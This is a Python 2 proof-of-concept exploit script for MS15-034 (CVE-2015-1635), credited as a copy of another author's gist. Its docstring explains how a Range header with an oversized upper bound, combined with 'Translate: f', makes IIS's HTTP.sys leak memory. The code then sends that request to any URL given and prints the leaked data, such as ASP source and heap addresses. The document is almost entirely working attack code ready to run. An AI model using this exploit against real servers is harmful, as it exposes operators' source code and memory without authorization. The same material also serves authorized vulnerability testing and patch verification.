#!/usr/bin/python2

"""

COPY of leak PoC script, full credit goes to https://gist.github.com/worawit/54f2e5a7a1a028191f76

MS15-034 (CVE-2015-1635) proof of concept to do information leak
This PoC is safe to run against vulnerable target. No crash the IIS server or OS.
From the pseudocode, if the request header "Translate: f" is presented, HTTP.sys 
will call UlSendHttpResponse() for sending response. This function does not make
IIS or OS crashed even Range length is invalid.
With "Translate: f" header, the HTTP.sys will not cache response, so HTTP.sys uses 
data from user space memory. The result is HTTP.sys will read and send data from 
user space memory until accessing invalid memory address. But sending data use buffer
about 64KB. If accessing invalid memory address is found before data buffer is full,
all buffered data is discard. So there is a chance to get nothing or missing some
trail data in memory chunk.
Here is what you can get from this PoC
- leak ASP source code
- determine the target architecture (32 bit or 64 bit)
- leak some valid heap address in remote w3wp.exe
- other static files (useless)
Other code paths for leaking data are in UlSendCachedResponse() and UlCacheAndSendResponse().
These 2 functions use UlpBuildSliceRangeMdl() for building chunk. These path
might crash target OS as explained in psuedocode comment.
Note: To exploit these paths read (I'm lazy to explain)
- http://blog.trendmicro.com/trendlabs-security-intelligence/iis-at-risk-an-in-depth-look-into-cve-2015-1635/
- http://www.securitysift.com/an-analysis-of-ms15-034/
A 'If-Range:' header might be needed (I cannot remember) if you want code to 
call UlSendCachedResponse().
"""

import sys
import urllib2
import socket

if len(sys.argv) < 2:
    print('{} url [contentLength]'.format(sys.argv[0]))
    sys.exit(1)

url = sys.argv[1]
    

if len(sys.argv) > 2:
    contentLength = int(sys.argv[2])
else:
    req = urllib2.Request(url)
    req.get_method = lambda : 'HEAD'
    resp = urllib2.urlopen(req)
    contentLength = int(resp.info()['Content-Length'])
    resp.close()
    print('contentLength: {:d}'.format(contentLength))

def dump_data(offset, tail_length):
    req = urllib2.Request(url)
    req.add_header('Range', 'bytes={:d}-18446744073709551615'.format(offset))
    req.add_header('Translate', 'f')

    resp = None
    data = ""
    try:
        resp = urllib2.urlopen(req)
        if tail_length > 0:
            resp.read(tail_length)
        while True:
            data += resp.read(1)
        resp.close()
    except socket.error as e:
        if resp is not None:
            resp.close()
    return data

tail_length = 60000
offset = contentLength - tail_length
if offset < 2:
    offset = 2
    tail_length = contentLength - 2

data = dump_data(offset, tail_length)
if len(data) > 0:
    print(data)